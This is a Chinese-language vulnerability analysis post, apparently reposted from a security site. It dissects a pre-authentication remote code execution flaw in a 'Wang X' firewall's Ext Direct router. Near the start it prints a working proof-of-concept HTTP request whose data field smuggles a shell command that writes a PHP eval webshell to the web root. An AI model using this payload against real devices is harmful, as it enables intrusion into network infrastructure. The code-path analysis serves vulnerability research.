> 原文链接: https://www.anquanke.com//post/id/243331 


# 网X防火墙前台RCE


                                阅读量   
                                **180584**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t010a0dc303b8542555.png)](https://p1.ssl.qhimg.com/t010a0dc303b8542555.png)



## 前言

之前看到有关于这个漏洞的信息，于是想着自己在代码层次做一个详细的分析。

POC

```
POST /directdata/direct/router HTTP/1.1
Host: *.*.*.*
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 225


`{`
    "action": "SSLVPN_Resource",
    "method": "deleteImage",
    "data":[`{`
      "data":["/var/www/html/b.txt;echo '&lt;?php @eval($_POST[a]);?&gt;'&gt;/var/www/html/test.php"]
    `}`],
    "type": "rpc",
    "tid": 17
`}`
```

在获取源代码之后，我们直接关注路由信息

`var\www\html\applications\directdata\controllers\DirectController.php`

[![](https://p1.ssl.qhimg.com/t016215ea8e5a1baa39.png)](https://p1.ssl.qhimg.com/t016215ea8e5a1baa39.png)

我们可以看到这个函数中语句并不是很多，调用 `Ext_Direct::run(` 去处理了 request 过来的请求

因为包含了 php 文件 `/applications/Models/Ext/Direct.php` 所以 `Ext_Direct` 来源于此

`var\www\html\applications\Models\Ext\Direct.php`

[![](https://p1.ssl.qhimg.com/t01dd0ba225ca322489.png)](https://p1.ssl.qhimg.com/t01dd0ba225ca322489.png)

我们直接关注其中的 run 方法 发现首先 利用 `Ext_Direct_Request::factory` 对传入的请求进行了处理

var\www\html\applications\Models\Ext\Direct\Request.php

[![](https://p5.ssl.qhimg.com/t0183ac239ef8c5fb50.png)](https://p5.ssl.qhimg.com/t0183ac239ef8c5fb50.png)

对传入的请求首先解码，然后判断是否存在对应的参数，之后返回一个新的类

`var\www\html\applications\Models\Ext\Direct\Request.php#__construct`

[![](https://p5.ssl.qhimg.com/t013742e3233786c375.png)](https://p5.ssl.qhimg.com/t013742e3233786c375.png)

此处注意到在创建新的类的时候，前台传入的 `data` 参数 对应的是 `arguments`

再返回函数 `Ext_Direct::run`

[![](https://p3.ssl.qhimg.com/t01a254e1562dbdc561.png)](https://p3.ssl.qhimg.com/t01a254e1562dbdc561.png)

将 request 的请求处理之后，转换为数组类型，首先判断传入的 `action` 值 ，是否存在这个类，然后 new 一个这样的类；再判断这个类中是否存在`Method` 所对应的方法；最后到达存在漏洞的关键函数`call_user_func_array(array($dao, $r-&gt;getMethod()), $r-&gt;getArguments())`

这个函数如果全部 request 的相关参数的表示的话 应该是 `call_user_func_array(array(action, Method), data)` 就是以 data 为参数值，调用 action 类中的 Method 方法

根据公开的 POC 找到函数位置

`var\www\html\applications\Models\SSLVPN\Resource.php`

[![](https://p4.ssl.qhimg.com/t017609db3dde3e1d99.png)](https://p4.ssl.qhimg.com/t017609db3dde3e1d99.png)

直接从参数 `$params` 中提取出 data 部分，拼接到 `$cmd`

[![](https://p5.ssl.qhimg.com/t01ccb04360d9542211.png)](https://p5.ssl.qhimg.com/t01ccb04360d9542211.png)

存在回调函数的话，就可以任意调用任何一个类当中的任何方法

`var\www\html\applications\Models\System\PostSignature.php#getMd5sum`

[![](https://p3.ssl.qhimg.com/t01806b19f345aee3cb.png)](https://p3.ssl.qhimg.com/t01806b19f345aee3cb.png)

[![](https://p2.ssl.qhimg.com/t01a36eaa18f8531f65.png)](https://p2.ssl.qhimg.com/t01a36eaa18f8531f65.png)
